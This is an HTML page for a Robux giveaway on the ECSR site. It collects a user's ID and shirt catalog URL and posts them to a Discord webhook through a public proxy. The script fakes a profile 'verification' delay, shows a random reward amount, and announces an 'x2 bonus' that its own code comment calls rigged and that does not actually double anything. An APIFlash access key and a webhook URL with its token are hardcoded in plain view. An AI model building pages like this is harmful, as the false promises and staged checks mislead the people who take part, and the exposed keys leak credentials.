<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ECSR Robux Giveaway</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');

  body {
    background: #0a0a23;
    color: #8affff;
    font-family: 'Orbitron', monospace, sans-serif;
    max-width: 480px;
    margin: 2rem auto;
    padding: 1.5rem 2rem;
    text-align: center;
    user-select: none;
  }

  h1 {
    font-size: 2.5rem;
    color: #66ffff;
    text-shadow:
      0 0 5px #66ffff,
      0 0 10px #66ffff,
      0 0 20px #00ffff,
      0 0 30px #00ffff,
      0 0 40px #00ffff;
    margin-bottom: 1.5rem;
  }

  label {
    display: block;
    margin-bottom: 0.5rem;
    font-weight: 700;
    color: #99ffff;
    text-shadow: 0 0 3px #33cccc;
  }

  input[type="text"], input[type="url"] {
    width: 100%;
    padding: 0.75rem 1rem;
    font-size: 1.1rem;
    border: none;
    border-radius: 8px;
    background: #001f33;
    color: #8affff;
    box-shadow:
      inset 0 0 5px #00ffff,
      0 0 8px #00ffff;
    transition: box-shadow 0.3s ease;
  }
  input[type="text"]:focus, input[type="url"]:focus {
    outline: none;
    box-shadow:
      inset 0 0 12px #00ffff,
      0 0 15px #66ffff;
  }

  button {
    margin-top: 1rem;
    padding: 0.75rem 0;
    width: 100%;
    font-size: 1.2rem;
    font-weight: 700;
    color: #00ffff;
    background: transparent;
    border: 2px solid #00ffff;
    border-radius: 10px;
    cursor: pointer;
    text-shadow:
      0 0 5px #00ffff,
      0 0 10px #66ffff;
    box-shadow:
      0 0 8px #00ffff;
    transition: background-color 0.3s ease, color 0.3s ease;
  }
  button:hover {
    background-color: #00ffff;
    color: #001f33;
    box-shadow:
      0 0 20px #00ffff,
      0 0 40px #66ffff;
  }

  p {
    font-size: 1.1rem;
    color: #99ffff;
    text-shadow: 0 0 3px #33cccc;
  }

  img {
    max-width: 100%;
    border: 3px solid #00ffff;
    border-radius: 15px;
    margin: 1rem 0;
    box-shadow:
      0 0 15px #00ffff;
  }

  .hidden {
    display: none;
  }

  .center {
    text-align: center;
  }
</style>
</head>
<body>

<h1>ECSR Robux Giveaway</h1>

<div id="step1">
  <label for="ecsrId">Enter your ECSR ID:</label>
  <input type="text" id="ecsrId" placeholder="Your ECSR ID" required autocomplete="off" />
  <button id="startBtn" type="button">Start Giveaway</button>
</div>

<div id="step2" class="hidden center">
  <p>Verifying your profile, please wait...</p>
  <p><small>(This may take 8-11 seconds)</small></p>
</div>

<div id="step3" class="hidden center">
  <p>Is this your profile? it takes while to load</p>
  <img id="profileImg" src="" alt="ECSR Profile Screenshot" />
  <button id="confirmProfileBtn" type="button">Yes, that's me!</button>
</div>

<div id="step4" class="hidden center">
  <p>ðŸŽ‰ You will get Robux!</p>
  <p>Calculating your reward amount...</p>
</div>

<div id="step5" class="hidden center">
  <p>Your Robux amount:</p>
  <h2 id="robuxAmount"></h2>
  <p>You also get x2 bonus! Your final amount is doubled.</p>
  <button id="proceedBtn" type="button">Proceed</button>
</div>

<div id="step6" class="hidden">
  <label for="shirtUrl">Enter your shirt catalog URL with price:</label>
<h2 id="robuxAmount"></h2>
  <input type="url" id="shirtUrl" placeholder="https://ecsr.io/catalog/..." required autocomplete="off" />
  <button id="submitGiveawayBtn" type="button">Submit & Claim</button>
</div>

<div id="step7" class="hidden center">
  <p>Thank you for participating! Your info was sent and you will receive your Robux soon.</p>
</div>

<script>
  const accessKey = '91aeaa0c407e4f089e1c49af78437242'; // APIFlash key
 const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
const webhookURL = proxyUrl + 'https://webhook.lewisakura.moe/api/webhooks/1375801999031009481/vd7Jp0aByQintEklFwy2tQurKJFdGPF9uIKczMqwTbEOV70avbjTXKdEpK2YViaiXD8r';

  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  const step4 = document.getElementById('step4');
  const step5 = document.getElementById('step5');
  const step6 = document.getElementById('step6');
  const step7 = document.getElementById('step7');

  const ecsrIdInput = document.getElementById('ecsrId');
  const startBtn = document.getElementById('startBtn');
  const profileImg = document.getElementById('profileImg');
  const confirmProfileBtn = document.getElementById('confirmProfileBtn');
  const robuxAmountEl = document.getElementById('robuxAmount');
  const proceedBtn = document.getElementById('proceedBtn');
  const shirtUrlInput = document.getElementById('shirtUrl');
  const submitGiveawayBtn = document.getElementById('submitGiveawayBtn');

  let ecsrId = '';
  let screenshotURL = '';
  let robuxAmount = 0;
  let finalAmount = 0;

  startBtn.addEventListener('click', () => {
    console.log('Start Giveaway clicked');
    ecsrId = ecsrIdInput.value.trim();
    if (!ecsrId) {
      alert('Please enter your ECSR ID.');
      return;
    }
    step1.classList.add('hidden');
    step2.classList.remove('hidden');

    const waitTime = 8000 + Math.floor(Math.random() * 3000);
    setTimeout(() => {
      screenshotURL = `https://api.apiflash.com/v1/urltoimage?access_key=${accessKey}&url=${encodeURIComponent('https://ecsr.io/users/' + ecsrId + '/profile')}&format=png&delay=2&response_type=image`;
      profileImg.src = screenshotURL;

      step2.classList.add('hidden');
      step3.classList.remove('hidden');
    }, waitTime);
  });

  confirmProfileBtn.addEventListener('click', () => {
    step3.classList.add('hidden');
    step4.classList.remove('hidden');

    setTimeout(() => {
      robuxAmount = 50 + Math.floor(Math.random() * 101);
      const halved = Math.floor(robuxAmount / 2);
      finalAmount = halved * 2; // rigged x2 bonus

      step4.classList.add('hidden');
      step5.classList.remove('hidden');
      robuxAmountEl.textContent = `${finalAmount} Robux`;
    }, 2000);
  });

  proceedBtn.addEventListener('click', () => {
    step5.classList.add('hidden');
    step6.classList.remove('hidden');
  });

  submitGiveawayBtn.addEventListener('click', () => {
    const shirtUrl = shirtUrlInput.value.trim();
    if (!shirtUrl || !shirtUrl.startsWith('https://ecsr.io/catalog/')) {
      alert('Please enter a valid ECSR shirt catalog URL.');
      return;
    }

    fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: null,
        embeds: [
          {
            title: "ECSR Giveaway Entry",
            color: 0x00FFAA,
            fields: [
              { name: "ECSR ID", value: ecsrId, inline: true },
              { name: "Robux Amount", value: `${finalAmount} Robux`, inline: true },
              { name: "Shirt Catalog URL", value: shirtUrl },
              { name: "Profile Screenshot", value: screenshotURL }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      })
    }).then(() => {
      step6.classList.add('hidden');
      step7.classList.remove('hidden');
    }).catch(() => {
      alert('Failed to submit. Please try again later.');
    });
  });
</script>

</body>
</html>
